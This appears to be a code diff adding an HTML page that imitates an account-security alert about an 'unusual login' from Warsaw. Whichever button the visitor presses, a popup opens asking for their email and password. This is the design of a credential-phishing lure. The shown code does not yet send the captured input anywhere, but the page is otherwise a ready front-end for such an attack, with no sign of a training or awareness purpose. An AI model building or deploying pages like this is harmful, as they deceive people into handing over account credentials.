@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert </title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#eaeaea;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.phone{
+    width:360px;
+    background:white;
+    border-radius:25px;
+    box-shadow:0 15px 35px rgba(0,0,0,0.2);
+    padding:25px;
+    text-align:center;
+}
+
+.logo img{
+    width:180px;
+}
+
+h1{
+    margin-top:20px;
+    font-size:28px;
+}
+
+h3{
+    font-weight:normal;
+    margin-top:5px;
+}
+
+.info{
+    margin-top:15px;
+    color:#333;
+    font-size:15px;
+}
+
+.gray-btn{
+    width:100%;
+    padding:12px;
+    margin-top:20px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    background:#f3f3f3;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+.blue-btn{
+    width:100%;
+    padding:15px;
+    margin-top:15px;
+    border:none;
+    border-radius:8px;
+    background:linear-gradient(to right,#2a6df4,#4aa3ff);
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+/* Popup */
+
+.modal{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.6);
+    justify-content:center;
+    align-items:center;
+}
+
+.modal-content{
+    background:white;
+    width:300px;
+    padding:20px;
+    border-radius:12px;
+    text-align:center;
+    animation:pop 0.3s ease;
+}
+
+@keyframes pop{
+    from{transform:scale(0.7);opacity:0;}
+    to{transform:scale(1);opacity:1;}
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    border-radius:6px;
+    border:1px solid #ccc;
+}
+
+.login-btn{
+    width:100%;
+    padding:12px;
+    margin-top:15px;
+    border:none;
+    border-radius:6px;
+    background:#2a6df4;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="phone">
+    <div class="logo">
+        <img src="logo.png" alt="Logo">
+    </div>
+
+    <h1>Security Alert</h1>
+    <h3>Unusual Login Detected</h3>
+
+    <div class="info">
+        Another device has logged into your account<br><br>
+        Chrome · April 24, 2024<br>
+        Warsaw, Poland<br>
+        192.191.96.29
+    </div>
+
+    <button class="gray-btn" onclick="openPopup()">This was me</button>
+    <button class="blue-btn" onclick="openPopup()">Log out from other device</button>
+</div>
+
+<div class="modal" id="popup">
+    <div class="modal-content">
+        <h3>Login Required</h3>
+        <input type="text" placeholder="Email">
+        <input type="password" placeholder="Password">
+        <button class="login-btn">Logout Device</button>
+    </div>
+</div>
+
+<script>
+function openPopup(){
+    document.getElementById("popup").style.display="flex";
+}
+
+window.onclick = function(event){
+    var modal = document.getElementById("popup");
+    if(event.target == modal){
+        modal.style.display="none";
+    }
+}
+</script>
+
+</body>
+</html>
